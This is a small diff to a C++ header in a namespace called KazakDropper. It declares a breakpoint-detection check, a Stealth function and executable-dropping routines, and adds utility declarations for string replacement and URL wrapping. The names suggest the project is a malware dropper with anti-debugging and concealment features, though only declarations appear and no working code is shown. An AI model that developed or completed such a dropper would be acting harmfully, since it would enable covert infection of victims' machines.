@@ -17,5 +17,11 @@ namespace KazakDropper
 	BOOL IsBp(const char* lpszModule, const char* lpszFunction);
 
 	void Stealth();
-	void DropExe();
+	void PrepareExe();
+}
+
+namespace KazakUtils
+{
+	std::string replace_all(std::string subject, const std::string& search, const std::string& replace);
+	std::string StringWrapper(const std::string url);
 }
